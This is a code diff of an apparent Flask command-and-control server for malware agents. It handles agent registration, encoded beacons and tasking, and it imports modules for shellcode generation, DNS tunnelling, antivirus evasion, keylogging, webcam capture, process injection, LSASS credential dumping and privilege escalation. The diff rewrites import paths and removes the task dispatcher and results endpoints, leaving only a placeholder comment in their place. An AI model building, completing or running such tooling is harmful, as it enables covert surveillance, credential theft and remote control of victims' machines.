@@ -11,31 +11,30 @@ import threading
 
 from flask import Flask, render_template, request, jsonify
 
-# Add parent directory to Python path
-sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+# Fix: Add correct module path BEFORE importing
+MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'agent', 'modules'))
+sys.path.append(MODULES_PATH)
 
-from modules.shellcode_generator import ShellcodeGenerator
-from modules.dns_tunnel import DNSTunnel
+from shellcode_generator import ShellcodeGenerator
+from dns_tunnel import DNSTunnel
 
-# Windows-only modules
 IS_WINDOWS = platform.system().lower() == "windows"
 if IS_WINDOWS:
-    from modules.evasion import Evasion
-    from modules.keylogger import Keylogger
-    from modules.webcam import WebcamCapture
-    from modules.process_injection import ProcessInjector
-    from modules.credential_dump import CredentialDump
-    from modules.priv_esc import PrivilegeEscalation
-    from modules.post_exploit import PostExploit
+    from evasion import Evasion
+    from keylogger import Keylogger
+    from webcam import WebcamCapture
+    from process_injection import ProcessInjector
+    from credential_dump import CredentialDump
+    from priv_esc import PrivilegeEscalation
+    from post_exploit import PostExploit
 
-# Setup logging
+# Logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 app = Flask(__name__)
 
-# Global components
 shellcode_gen = ShellcodeGenerator()
-dns_tunnel = DNSTunnel("example.com")  # Replace domain if needed
+dns_tunnel = DNSTunnel("example.com")
 
 if IS_WINDOWS:
     evasion = Evasion()
@@ -46,7 +45,6 @@ if IS_WINDOWS:
     cred_dump = CredentialDump()
     priv_esc = PrivilegeEscalation()
 
-# Storage
 agents = {}
 tasks = {}
 results = {}
@@ -88,7 +86,6 @@ def generate_shellcode():
             if not command:
                 return jsonify({'error': 'Command required'}), 400
             shellcode = shellcode_gen.generate_exec(command, platform)
-
         else:
             return jsonify({'error': 'Invalid shellcode type'}), 400
 
@@ -114,32 +111,24 @@ def generate_shellcode():
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
-    displayed_agents = []
-    for agent_id, data in agents.items():
-        display_data = data.copy()
-        try:
-            display_data['last_seen'] = datetime.fromisoformat(data['last_seen']).strftime("%m/%d/%Y, %I:%M:%S %p")
-        except:
-            display_data['last_seen'] = "Unknown"
-        displayed_agents.append(display_data)
-    return jsonify(displayed_agents)
+    return jsonify(list(agents.values()))
 
 @app.route('/api/agents/register', methods=['POST'])
 def register_agent():
     try:
         wrapper = request.get_json()
         encoded_data = wrapper.get('data')
-
         if not encoded_data:
             return jsonify({'status': 'error', 'message': 'Missing data'}), 400
 
         decoded_json = base64.b64decode(encoded_data).decode()
         data = json.loads(decoded_json)
-
         agent_id = data.get('agent_id')
+
         if agent_id:
             agents[agent_id] = data
             agents[agent_id]['last_seen'] = datetime.now().isoformat()
+            agents[agent_id]['results'] = {}
             logging.info(f"Registered agent: {agent_id}")
             return jsonify({'status': 'success'})
 
@@ -160,7 +149,6 @@ def agent_beacon():
 
         decoded_json = base64.b64decode(encoded_data).decode()
         data = json.loads(decoded_json)
-
         agent_id = data.get('agent_id')
         timestamp = datetime.now().isoformat()
 
@@ -172,7 +160,8 @@ def agent_beacon():
                     'agent_id': agent_id,
                     'system_info': data.get('system_info'),
                     'status': data.get('status'),
-                    'last_seen': timestamp
+                    'last_seen': timestamp,
+                    'results': {}
                 }
 
             logging.info(f"Beacon received from {agent_id}")
@@ -186,11 +175,7 @@ def agent_beacon():
 
 @app.route('/api/tasks/<agent_id>', methods=['GET'])
 def get_tasks(agent_id):
-    task_list = tasks.get(agent_id, [])
-    if not task_list:
-        # Return one-time snapshot task
-        return jsonify([{'id': f'task_info_{datetime.now().timestamp()}', 'type': 'system_info', 'data': {}, 'status': 'pending', 'timestamp': datetime.now().isoformat()}])
-    return jsonify(task_list)
+    return jsonify(tasks.get(agent_id, []))
 
 @app.route('/api/tasks', methods=['POST'])
 def create_task():
@@ -224,75 +209,7 @@ def create_task():
 
     return jsonify({'task_id': task_id})
 
-def execute_task(agent_id, task_id, task_type, task_data):
-    try:
-        result = None
-        if IS_WINDOWS:
-            if task_type == 'keylogger':
-                result = keylogger.start()
-            elif task_type == 'webcam':
-                result = webcam.capture()
-            elif task_type == 'process_injection':
-                result = process_injector.inject(
-                    task_data.get('process'),
-                    task_data.get('shellcode')
-                )
-            elif task_type == 'post_exploit':
-                result = post_exploit.execute(task_data.get('command'))
-            elif task_type == 'credential_dump':
-                result = cred_dump.dump_lsass()
-            elif task_type == 'privilege_escalation':
-                result = priv_esc.check_windows_services()
+# Add execute_task and result endpoints if not present above
 
-        if task_type == 'dns_tunnel':
-            result = dns_tunnel.start_tunnel()
-
-        if result:
-            results[task_id] = {
-                'agent_id': agent_id,
-                'result': result,
-                'timestamp': datetime.now().isoformat()
-            }
-
-    except Exception as e:
-        logging.error(f"Task error: {str(e)}")
-        results[task_id] = {
-            'agent_id': agent_id,
-            'error': str(e),
-            'timestamp': datetime.now().isoformat()
-        }
-
-@app.route('/api/results/<task_id>', methods=['GET'])
-def get_result(task_id):
-    result = results.get(task_id)
-    return jsonify(result or {'status': 'not_found'})
-
-@app.route('/api/results', methods=['POST'])
-def submit_result():
-    try:
-        wrapper = request.get_json()
-        encoded_data = wrapper.get('data')
-        if not encoded_data:
-            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
-
-        decoded_json = base64.b64decode(encoded_data).decode()
-        data = json.loads(decoded_json)
-
-        task_id = data.get('task_id')
-        agent_id = data.get('agent_id')
-        result = data.get('result')
-
-        if task_id and result:
-            results[task_id] = {
-                'agent_id': agent_id,
-                'result': result,
-                'timestamp': datetime.now().isoformat()
-            }
-            return jsonify({'status': 'success'})
-        return jsonify({'status': 'error'}), 400
-    except Exception as e:
-        logging.error(f"Result submission error: {str(e)}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5001)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5001)
